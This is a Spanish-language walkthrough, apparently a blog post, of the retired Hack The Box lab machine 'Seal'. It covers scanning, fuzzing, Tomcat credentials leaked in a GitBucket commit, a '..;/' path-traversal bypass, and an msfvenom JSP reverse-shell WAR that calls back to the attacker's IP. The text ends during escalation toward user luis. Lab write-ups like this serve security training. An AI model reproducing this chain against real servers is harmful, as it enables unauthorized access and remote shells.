---
layout: post
title:  "Maquina Retirada Seal de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada SEAL
tags: HTB, Tomcat, Gitbucket, msfvenom, Web Hacking, Maquinas Retiradas, Writeup, 
---

# Seal ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.250       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
# Nmap 7.91 scan initiated Tue Jul 20 17:30:18 2021 as: nmap -sC -sV -p22,443,8080 -oN target 10.10.10.250
Nmap scan report for 10.10.10.250
Host is up (0.053s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Tue, 20 Jul 2021 15:30:27 GMT
|     Set-Cookie: JSESSIONID=node01kw6b4gn2hivrrjdvhvjra7472.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Tue, 20 Jul 2021 15:30:26 GMT
|     Set-Cookie: JSESSIONID=node0p0sfk1cil6371sqzhr3m9qphz0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 20 Jul 2021 15:30:27 GMT
|     Set-Cookie: JSESSIONID=node01wl1o9iqo05a51uao83w56od331.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=7/20%Time=60F6EC11%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Tue,\x2020\x2
SF:0Jul\x202021\x2015:30:26\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0p0sfk
SF:1cil6371sqzhr3m9qphz0\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu
SF:,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html
SF:;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,109,"HTT
SF:P/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2020\x20Jul\x202021\x2015:30:27\x
SF:20GMT\r\nSet-Cookie:\x20JSESSIONID=node01wl1o9iqo05a51uao83w56od331\.no
SF:de0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2
SF:000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\
SF:x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/h
SF:tml;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close
SF:\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Versio
SF:n</pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nD
SF:ate:\x20Tue,\x2020\x20Jul\x202021\x2015:30:27\x20GMT\r\nSet-Cookie:\x20
SF:JSESSIONID=node01kw6b4gn2hivrrjdvhvjra7472\.node0;\x20Path=/;\x20HttpOn
SF:ly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nConte
SF:nt-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r
SF:(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nCon
SF:tent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\n
SF:Connection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\
SF:x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x204
SF:00\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;ch
SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
SF:0CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Identificamos un dominio que introducimos al fichero `/etc/hosts` --> `seal.htb`
Procedemos a fuzzear la web en buscar de directorios interesantes
```bash
# wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt https://seal.htb/FUZZ                                                                               2 ⨯ 1 ⚙
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://seal.htb/FUZZ
Total requests: 207630

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
=====================================================================

000000003:   302        0 L      0 W        0 Ch        "images"                                                                                                                                          
000000001:   200        518 L    1140 W     19737 Ch    "https://seal.htb/"                                                                                                                               
000000243:   302        0 L      0 W        0 Ch        "admin"                                                                                                                                           
000000530:   302        0 L      0 W        0 Ch        "css"                                                                                                                                             
000000426:   302        0 L      0 W        0 Ch        "icon"                                                                                                                                            
000000907:   302        0 L      0 W        0 Ch        "js"                                                                                                                                              
000004562:   302        0 L      0 W        0 Ch        "manager"
```
Vemos que tenemos bastantes directorios chequeamos manualmente para ver los recursos, y encontramos un `403 Forbidden`
Procedemos a seguir FUzzeando por el directorio encontrado `manager`
```bash
# wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt https://seal.htb/manager/FUZZ                                                                     130 ⨯ 1 ⚙
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://seal.htb/manager/FUZZ
Total requests: 207630

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
=====================================================================

000000001:   302        0 L      0 W        0 Ch        "https://seal.htb/manager/"                                                                                                                       
000000003:   302        0 L      0 W        0 Ch        "images"                                                                                                                                          
000000079:   403        7 L      10 W       162 Ch      "html"                                                                                                                                            
000000324:   401        63 L     291 W      2499 Ch     "text"                                                                                                                                            
000000733:   401        63 L     291 W      2499 Ch     "status"
```
Comprobando los subdirectorios para el recurso `manager` encontramos un panel login en la ruta `/manager/status`
Probamos credenciales por defecto y vemos que no optenemos acceso.
Encontramos la version del Tomcat en la siguiente ruta `https://10.10.10.250/admin/`
Procedemos a enumerar el servicio `http-proxy` por el puerto `8080` y nos encontramos otro panel de Login donde nos podemos Registrar, nos registramos y accedemos
```bash
http://seal.htb:8080/signin;jsessionid=node01ihai0hk4uf3tuf205qlxevix0.node0?redirect=%2F
```
Procedemos a Registrarnos y al entrar vemos que estamos ante un `GitBucket`, se parece mucho a `Github` encuanto a estructuras de archivos.
Procedemos a Apuntar a la ruta del proyecto de `root/seal_market`, encontramos tres directorios:
```bash
"* app *"
"* nginx *"
"* tomcat *"
" Readme.md "
```
Procedemos a meternos en los directorios `app, nginx, tomcat` como vemos que podemos visualizar los recursos de los CMS pensamos que podriamos encontrar algun archivo interesante
con credenciales en texto claro. Procedemos a buscar por los ultimos commits para cada recurso
Damos con el `Last Commit` 
```bash
tomcat/tomcat-users.xml
	
		  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
		  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
		  <user username="role1" password="<must-be-changed>" roles="role1"/>
		-->
		<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
		</tomcat-users>
```
Encontramos este archivo con la password y user para el `tomcat`
Procedemos a intentar loggearnos en el otro login en la direccion `https://seal.htb/manager/status`

Conseguimos acceso con las Credenciales obtenidas, procedemos a intentar listar las aplicaciones del Tomcat y vemos que recibimos un `403 Forbiden`
Buscando info sobre como podemos hacer para listar la `Apliccaciones del Tomcat disponibles` encontramos este recurso que nos indica una posible forma de hacerlo. 
```bash
https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
```
La forma
```bash
https://10.10.10.250/manager/status/..;/html/
```
Ahora para ganar acceso a la maquina victima, en los CMS Tomcat podemos subir un archivo `.war` `malicioso`.
```bash
# msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.16.7 lport=443 -f war > setenso.war                                                                                                                35 ⨯ 1 ⚙
Payload size: 1083 bytes
Final size of war file: 1083 bytes
```
Una vez tenemos el archivo creado, vamos a intentar subirlo. Nos vamos a donde pone `WAR file to deploy` y procedemos a intentar subir el archivo
```bash
https://10.10.10.250/manager/html/upload;jsessionid=30996A6436CBB5E16EE0296121D0CCA8?org.apache.catalina.filters.CSRF_NONCE=B68A395DF24E8D8C6E14811F6E50C638
403 FORBIDDEN
```
Vale vemos que tenemos un problema porque la url como veiamos no nos funciona correctamente `/manager/html/upload` en esta seccion. Nos abrimos burpsuite para cambiar esta parte
a `manager/status/..;/html/upload` y subir el archivo correctamente.
```bash
POST /manager/status/..;/html/upload;jsessionid=30996A6436CBB5E16EE0296121D0CCA8?org.apache.catalina.filters.CSRF_NONCE=B68A395DF24E8D8C6E14811F6E50C638 HTTP/1.1
```
Lo conseguimos subir correctamente. Procedo a ponerme una session con `nc -vlnp 443` a la escucha para recibir la conexion entrante.
```bash
# nc -vlnp 443                                                                                                                                                                                               2 ⚙
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.250] 56870
whoami
tomcat
```
Procedemos a realizar el tratamiento de la shell como siempre.
Procedemos a enumerar el sistema en busca de la flag.
```bash
tomcat@seal:/home/luis$ cat user.txt 
cat: user.txt: Permission denied
```
Vemos que tenemos que saltar del user tomcat al user Luis.
```bash
tomcat@seal:/home/luis$ find / -group luis -type f 2>/dev/null
/opt/backups/archives/backup-2021-11-14-10:56:33.gz
/opt/backups/archives/backup-2021-11-14-10:55:33.gz
/opt/backups/playbook/run.ym
```
Enumerando encontramos en la ruta `/opt/backups/` archivos que pertenecen al user Luis, se pone interesante.
